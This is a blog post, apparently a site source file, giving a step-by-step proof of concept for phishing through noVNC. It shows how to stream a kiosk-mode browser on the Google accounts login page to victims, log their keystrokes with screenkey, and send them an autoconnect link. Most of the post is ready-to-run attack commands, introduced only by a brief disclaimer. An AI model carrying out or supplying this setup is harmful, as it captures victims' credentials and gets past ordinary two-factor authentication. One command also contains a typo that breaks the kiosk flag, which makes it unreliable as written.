---
layout: distill
title: Phishing Attacks with VNC
date: 2024-05-04
description: TBA
tags: tag, tag
categories: TBA
pretty_table: true
thumbnail: TBA
toc:
  - name: Introduction
  - name: Important Disclaimer
  - name: Security Context
  - name: PoC
  - name: Conclusions
  - name: Credits
---

### Introduction

On February 19, 2022, [Mr. d0x](https://twitter.com/mrd0x) a cybersecurity researcher introduced a method that uses VNC for phishing attacks. I was impressed by the cleverness of this idea.

### Background

VNC, or Virtual Network Computing, is a way to share screens and control another computer remotely. It works by installing a VNC server on the computer you want to control, and a VNC viewer on the device you're using to control it.

Using VNC in a phishing attack is straightforward. We set up a VNC server, share our screen, specifically our browser window, and trick the victim into believing they are controlling their own browser while they are actually connected to our browser, allowing us to intercept any data that passes.

Using a library called [noVNC](https://novnc.com/), we can establish connections to VNC servers through modern web browsers.

This phishing technique has several benefits over traditional phishing methods:

- We can record all keystrokes made by the victim
- We can watch in real-time what the victim is doing on a website
- Regular Two-factor authentication will not protect against this type of attack

### Important Disclaimer

The information provided is for educational purposes only. I do not take responsibility for any actions taken based on the information provided.

### Security Context

Please note that the PoC demonstrated in this guide is not safe for "production" use, as it lacking essential security configurations.

---

### Prerequisites

- Linux

---

### PoC

#### Firefox

First, we launch Firefox or any other browser in kiosk mode with the website we want to phish. For this example, we will use Google accounts.

Kiosk mode is a feature that can restrict user activities and interactions outside the intended scope of operation, this is necessary to prevent the victim from controlling other areas of our attacking machine, which may lead to unwanted access or control.

In the terminal, execute:

```bash
firefox --kisok https://accounts.google.com
```

#### noVNC

Now, in a new terminal window, we will run a noVNC server:

```bash
git clone https://github.com/novnc/noVNC
cd noVNC
./utils/novnc_proxy --listen 0.0.0.0:8080 --vnc localhost:5900
```

{% include figure.liquid loading="eager" path="assets/img/posts/2/2.png" class="img-fluid rounded z-depth-1" zoomable=true %}

#### VNC

Now, we need to obtain the ID of the running Firefox process:

1. Run `xwininfo | grep id` in the terminal
2. Click on the Firefox window.
3. In the terminal, the window ID will be displayed.

{% include figure.liquid loading="eager" path="assets/img/posts/2/3.png" class="img-fluid rounded z-depth-1" zoomable=true %}

Once we have obtained the window ID of Firefox using `xwininfo`, we can start a local VNC server by running:

```bash
sudo apt update
sudo apt install x11vnc
x11vnc -id <window_id>
```

#### Keystroke Logger

Once we have started the local VNC server, we can use the screenkey tool to view key presses by the victim in real time. It is important to note that screenkey will display our own key presses as well.

```
sudo apt install screenkey -y
screenkey
```

#### Victim

Almost there! The last step is to have the victim open their browser and enter the following URL: `http://<ip>:8080/vnc.html?autoconnect=true`. Once they enter this URL, they will see what looks like the Google accounts login page. Little do they know, it's actually a live streaming video that they can interact with. It's a pretty sneaky and clever trick.

{% include figure.liquid loading="eager" path="assets/img/posts/2/4.png" class="img-fluid rounded z-depth-1" zoomable=true %}
